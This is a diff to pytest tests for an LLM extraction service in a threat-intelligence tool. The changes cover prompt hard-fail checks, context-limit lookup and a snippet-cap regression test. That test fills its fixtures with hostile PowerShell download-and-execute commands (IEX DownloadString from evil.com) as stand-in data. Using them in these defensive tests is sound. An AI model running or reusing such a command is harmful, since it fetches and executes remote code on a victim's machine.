@@ -210,136 +210,6 @@ class TestRankArticle:
 
 
 # ---------------------------------------------------------------------------
-# extract_observables -- hard-fail on empty system/role
-# ---------------------------------------------------------------------------
-
-
-class TestExtractObservablesHardFail:
-    """Regression: empty system/role in extract_observables must hard-fail (not silently fall back).
-
-    extract_observables is a legacy code path. These tests pin the fail-closed guarantee so
-    it can't regress even if the method is called with a misconfigured file-based prompt.
-    The active extraction path now goes through extract_behaviors (ai.py routes).
-    """
-
-    @pytest.mark.asyncio
-    async def test_extract_observables_raises_when_system_empty(self, llm_service, tmp_path):
-        """When prompt config has empty system AND role, raises PreprocessInvariantError.
-
-        Previously the code silently constructed a fallback system message from `task`,
-        masking misconfiguration. Now it fails loudly so the user sees the problem.
-        """
-        import json
-
-        prompt_file = tmp_path / "ExtractAgent_empty"
-        prompt_file.write_text(
-            json.dumps(
-                {
-                    "system": "",
-                    "role": "",
-                    "task": "Extract observables",
-                    "instructions": "Output JSON",
-                }
-            )
-        )
-
-        with (
-            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
-        ):
-            mock_ctx.return_value = {"context_length": 32768, "is_sufficient": True, "method": "test"}
-            with pytest.raises(
-                PreprocessInvariantError, match="ExtractObservables prompt resolved to an empty system message"
-            ):
-                await llm_service.extract_observables(
-                    content="x" * 2000,
-                    title="Test",
-                    url="https://example.com",
-                    prompt_file_path=str(prompt_file),
-                )
-
-    @pytest.mark.asyncio
-    async def test_extract_observables_raises_when_system_and_role_missing(self, llm_service, tmp_path):
-        """When neither system nor role keys exist, raises PreprocessInvariantError."""
-        import json
-
-        prompt_file = tmp_path / "ExtractAgent_missing_role"
-        prompt_file.write_text(
-            json.dumps(
-                {
-                    "task": "Extract observables",
-                    "instructions": "Output JSON",
-                }
-            )
-        )
-
-        with (
-            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
-        ):
-            mock_ctx.return_value = {"context_length": 32768, "is_sufficient": True, "method": "test"}
-            with pytest.raises(
-                PreprocessInvariantError, match="ExtractObservables prompt resolved to an empty system message"
-            ):
-                await llm_service.extract_observables(
-                    content="x" * 2000,
-                    title="Test",
-                    url="https://example.com",
-                    prompt_file_path=str(prompt_file),
-                )
-
-    @pytest.mark.asyncio
-    async def test_extract_observables_does_not_hard_fail_when_role_present(self, llm_service, tmp_path):
-        """When 'role' is populated (even if 'system' is missing), the hard-fail is NOT triggered.
-
-        We don't assert on downstream parsing success here — only that the specific
-        PreprocessInvariantError guarding the empty-system case does not fire.
-        Downstream errors (if any) are unrelated to the hard-fail rule under test.
-        """
-        import json
-
-        prompt_file = tmp_path / "ExtractAgent_role_only"
-        prompt_file.write_text(
-            json.dumps(
-                {
-                    "role": "You are an extraction agent.",
-                    "task": "Extract observables",
-                    "instructions": "Output JSON",
-                }
-            )
-        )
-        llm_response = {
-            "choices": [
-                {
-                    "message": {
-                        "content": '{"behavioral_observables": [], "observable_list": [], "discrete_huntables_count": 0}'
-                    }
-                }
-            ],
-            "usage": {},
-        }
-        with (
-            patch.object(llm_service, "request_chat", new_callable=AsyncMock, return_value=llm_response),
-            patch.object(llm_service, "check_model_context_length", new_callable=AsyncMock) as mock_ctx,
-        ):
-            mock_ctx.return_value = {"context_length": 32768, "is_sufficient": True, "method": "test"}
-            # Whatever happens downstream, it MUST NOT be the empty-system hard-fail.
-            raised_invariant = False
-            try:
-                await llm_service.extract_observables(
-                    content="x" * 2000,
-                    title="Test",
-                    url="https://example.com",
-                    prompt_file_path=str(prompt_file),
-                )
-            except PreprocessInvariantError as e:
-                if "empty system message" in str(e):
-                    raised_invariant = True
-            except Exception:
-                # Other errors (response-shape parsing, etc.) are out of scope for this test.
-                pass
-            assert not raised_invariant, "Hard-fail should not fire when 'role' is populated"
-
-
-# ---------------------------------------------------------------------------
 # run_extraction_agent -- validation
 # ---------------------------------------------------------------------------
 
@@ -641,6 +511,52 @@ class TestRunExtractionAgentExecution:
         assert result.get("items") == []
         assert result.get("count") == 0
 
+    @pytest.mark.asyncio
+    @pytest.mark.regression
+    async def test_snippet_cap_preserves_article_in_prompt(self, llm_service):
+        """300+ snippets must not crowd out the article content in the LLM prompt.
+
+        Regression for article_2068: preprocessor produced 323 snippets which
+        consumed the entire context, leaving 0 chars for the article (0/7 extracted
+        with preprocessor ON vs 6/7 with it OFF).
+        """
+        article_text = "UNIQUE_ARTICLE_CONTENT " + "x" * MIN_USER_CONTENT_CHARS
+
+        fat_snippets = [
+            f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
+            for i in range(320)
+        ]
+
+        captured_messages = []
+
+        async def capture_request_chat(**kwargs):
+            captured_messages.extend(kwargs.get("messages", []))
+            return {"choices": [{"message": {"content": '{"items":[],"count":0}'}}], "usage": {}}
+
+        with (
+            patch(
+                "src.services.cmdline_attention_preprocessor.process",
+                return_value={"high_likelihood_snippets": fat_snippets, "full_article": article_text},
+            ),
+            patch.object(llm_service, "_get_context_limit", return_value=4000),
+            patch.object(llm_service, "request_chat", side_effect=capture_request_chat),
+        ):
+            await llm_service.run_extraction_agent(
+                agent_name="CmdlineExtract",
+                content=article_text,
+                title="Dense Article",
+                url="https://example.com",
+                prompt_config=_EXTRACT_PROMPT_CFG,
+                max_retries=1,
+                attention_preprocessor_enabled=True,
+            )
+
+        assert captured_messages, "request_chat was not called"
+        full_prompt = " ".join(m.get("content", "") for m in captured_messages)
+        assert "UNIQUE_ARTICLE_CONTENT" in full_prompt, (
+            "Article content was crowded out by snippet runaway -- cap is not working"
+        )
+
 
 # ---------------------------------------------------------------------------
 # Provider HTTP call methods -- _call_openai_chat, _call_anthropic_chat
@@ -768,24 +684,38 @@ class TestCallAnthropic:
 # ---------------------------------------------------------------------------
 
 
-class TestContextLimitForProvider:
-    """Tests for _get_context_limit_for_provider."""
+class TestContextLimit:
+    """Tests for _get_context_limit."""
 
     def test_lmstudio_returns_local_limit(self, llm_service):
-        limit = llm_service._get_context_limit_for_provider("lmstudio")
+        limit = llm_service._get_context_limit("lmstudio")
         assert limit == llm_service.assumed_lmstudio_context_tokens
 
     def test_openai_returns_cloud_limit(self, llm_service):
-        limit = llm_service._get_context_limit_for_provider("openai")
+        limit = llm_service._get_context_limit("openai")
         assert limit == llm_service.assumed_cloud_context_tokens
 
     def test_anthropic_returns_cloud_limit(self, llm_service):
-        limit = llm_service._get_context_limit_for_provider("anthropic")
+        limit = llm_service._get_context_limit("anthropic")
         assert limit == llm_service.assumed_cloud_context_tokens
 
     def test_none_provider_defaults_to_lmstudio(self, llm_service):
-        limit = llm_service._get_context_limit_for_provider(None)
+        limit = llm_service._get_context_limit(None)
         assert limit == llm_service.assumed_lmstudio_context_tokens
+
+    def test_known_model_returns_catalog_value(self, llm_service):
+        limit = llm_service._get_context_limit("openai", model_name="gpt-4o")
+        assert limit == 128_000
+
+    def test_unknown_model_falls_back_to_provider_default(self, llm_service):
+        limit = llm_service._get_context_limit("openai", model_name="not-a-real-model")
+        assert limit == llm_service.assumed_cloud_context_tokens
+
+    def test_model_lookup_takes_priority_over_provider_default(self, llm_service):
+        limit_with_model = llm_service._get_context_limit("openai", model_name="gpt-4.1")
+        limit_without = llm_service._get_context_limit("openai")
+        assert limit_with_model == 1_047_576
+        assert limit_with_model != limit_without
 
 
 # ---------------------------------------------------------------------------
